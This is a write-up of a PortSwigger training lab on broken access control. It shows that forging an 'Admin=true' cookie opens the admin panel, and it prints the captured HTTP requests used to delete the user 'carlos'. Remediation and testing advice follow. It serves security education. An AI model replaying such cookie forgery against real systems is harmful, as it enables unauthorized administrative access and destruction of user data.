# User Role Controlled by Request Parameter   

**Category**: 01-Broken-Access-Control  
**Lab_ID**: Role-Parameter-001  
**Source**: PortSwigger   
**Date_Completed**: 2025-10-10  
**Tag**: `Broken-Access-Control`, `Admin-Panel`, `Cookie-Manipulation`, `Horizontal-Privilege-Escalation`  


## Executive summary

The application's admin panel at `/admin` enforces user roles via a client-side forgeable cookie (`Admin=false/true`), without server-side validation. By logging in as a low-privileged user (`wiener:peter`) and manipulating the `Admin` cookie to `true`, an attacker can gain unauthorized access to the admin panel and perform administrative actions, such as deleting the `carlos` user account. This demonstrates broken access control, where client-controlled parameters dictate privileges, leading to horizontal privilege escalation.

**Result:** Logged in as `wiener` → modified `Admin` cookie to `true` → accessed `/admin` → deleted user `carlos`.  
**Severity (subjective):** High — allows low-privileged users to escalate to admin privileges.  
**Recommended immediate action:** Implement server-side role checks tied to authenticated sessions; avoid client-controlled role indicators.

---

## Objective

Access the admin panel by forging the role cookie and use it to delete the user `carlos`.

---

## Environment & tools

* Target: PortSwigger lab instance (Apprentice difficulty).  
* Tools: Modern browser; Burp Suite for intercepting and modifying requests/cookies.  
* Notes: Credentials provided: `wiener:peter`. Admin access controlled via `Admin` cookie.

---

## Discovery (how the vulnerability was found)

1. Logged in to the application using provided credentials (`wiener:peter`).  
2. Noticed the admin panel path `/admin` from lab instructions.  
3. Intercepted requests to `/admin` using Burp Suite and observed the `Admin=false` cookie in responses or requests.  
4. Manipulated the cookie to `Admin=true` in subsequent requests, granting access to the admin panel without authorization checks.  
5. In the admin UI, invoked the delete action for `carlos`.

> Finding: Role enforcement relies on a forgeable cookie, bypassing proper server-side authorization.

---

## Reproduction steps (concise, non-sensitive)

1. Log in to the application using credentials `wiener:peter` (via POST to `/login`).  
2. Use Burp Suite to intercept a request (e.g., to `/admin`).  
3. Modify the `Cookie` header: Change `Admin=false` to `Admin=true`.  
4. Forward the request to access the admin panel.  
5. Navigate to the user deletion endpoint (e.g., `/admin/delete?username=carlos`) with the forged cookie.  
6. Verify deletion via UI confirmation or lab success.

**Captured Burp Suite HTTP interactions (actual requests from exploitation):**

**Request to access admin panel (with forged cookie):**
```
GET /admin HTTP/2
Host: 0ac600f103d7739a815ea7a7003900ab.web-security-academy.net
Cookie: Admin=true; session=FfNmnzQLuQICG5mJl28i8UAKuv4YDTOm
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

**Additional request (WebSocket upgrade, observed but not directly used):**
```
GET /academyLabHeader HTTP/2
Host: 0ac600f103d7739a815ea7a7003900ab.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0ac600f103d7739a815ea7a7003900ab.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: Admin=false; session=FfNmnzQLuQICG5mJl28i8UAKuv4YDTOm
Sec-Websocket-Key: cqGYYHWGwXnV07eU7bL1zA==
```

**Request to delete user (with forged cookie):**
```
GET /admin/delete?username=carlos HTTP/2
Host: 0ac600f103d7739a815ea7a7003900ab.web-security-academy.net
Cookie: Admin=true; session=FfNmnzQLuQICG5mJl28i8UAKuv4YDTOm
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac600f103d7739a815ea7a7003900ab.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

---

## Observed impact

* Low-privileged user can escalate to admin and perform destructive actions (delete accounts).  
* Compromises integrity and availability of user data.  
* Potential for further escalation: delete multiple users, modify configurations, or extract sensitive data via admin functions.  
* Affects all authenticated users who can forge the cookie.

---

## Root cause analysis

* **Primary cause:** User role is determined by a client-modifiable cookie (`Admin=true/false`) without server-side verification against the session or user database.  
* **Secondary cause / contributing factor:** Lack of proper authorization checks on admin endpoints; assumes cookie integrity.

---

## Risk assessment

* **Likelihood:** High — any authenticated user can modify cookies using browser tools or proxies like Burp Suite.  
* **Impact:** High — full admin access leads to account deletions and potential data loss.  
* **Overall risk:** High.  
  Optionally map to CVSS: Preliminary estimate in the **High** range (e.g., CVSS base score ~7–8) due to easy privilege escalation.

---

## Remediation (recommended, prioritized)

### Immediate / short-term (apply within hours)

1. Remove reliance on client-side cookies for role enforcement.  
2. Temporarily restrict `/admin` endpoints to known admin IP ranges or disable if not critical.

### Medium-term (apply within days)

1. **Server-side authorization**: Validate user roles from session data or database on every admin request; reject if not admin.  
2. **Secure cookies**: Use HTTP-only, secure flags on cookies; sign or encrypt role indicators if needed (but prefer server-side checks).  
3. **CSRF protection**: Add anti-CSRF tokens to state-changing actions like deletions.  
4. **Use least privilege**: Ensure non-admin sessions cannot access admin paths (return 403).

### Long-term / defensive controls

1. Implement RBAC (role-based access control) with centralized authorization logic.  
2. Add audit logging for role changes and admin actions.  
3. Monitor for suspicious cookie manipulations or access attempts.  
4. Add automated tests ensuring admin endpoints enforce roles server-side.  
5. Conduct regular access control testing.

---

## Detection & verification guidance (for devs / QA / security teams)

* Verify admin routes check session-bound roles, not cookies.  
* Test with modified cookies: Ensure `/admin` returns `403` for non-admins even with `Admin=true`.  
* Scan code for direct use of request parameters/cookies in authorization decisions.  
* Use Burp Suite or similar to simulate forged requests in testing.  
* Add CI test: Authenticate as non-admin, forge cookie, assert access denied.

---

## Suggested tests to add

* Integration test: Non-admin with `Admin=true` cookie gets `403` on `/admin`.  
* Integration test: Admin deletion endpoint rejects non-admin sessions regardless of cookie.  
* Role test: Low-privileged user cannot delete others even with forged params.  
* Logging test: Failed admin access attempts log user and IP.  
* Fuzz test: Manipulate cookies/params and check for bypasses.

---

## References & further reading

* OWASP Top Ten — Broken Access Control  
* OWASP Authentication Cheat Sheet & Authorization Guidance  
* General guidance: Never trust client-side data for authorization; always validate server-side.

---

## Notes & lessons learned

* Cookies and parameters are fully client-controlled; they must not dictate privileges without verification.  
* Burp Suite is essential for intercepting and modifying requests to test access controls.  
* Combine authentication with authorization: Sessions should store roles immutably.

---

## Evidence & validation (for lab record)

* Login as `wiener` sets `Admin=false`.  
* Forged `Admin=true` granted access to `/admin`.  
* DELETE request to `/admin/delete?username=carlos` succeeded, confirmed by lab completion.
<img width="947" height="361" alt="image" src="https://github.com/user-attachments/assets/e8e8b83a-bab9-4157-877a-ac6371a7dfa5" />


---

> ⚠️ **Legal & ethical reminder:** This writeup documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
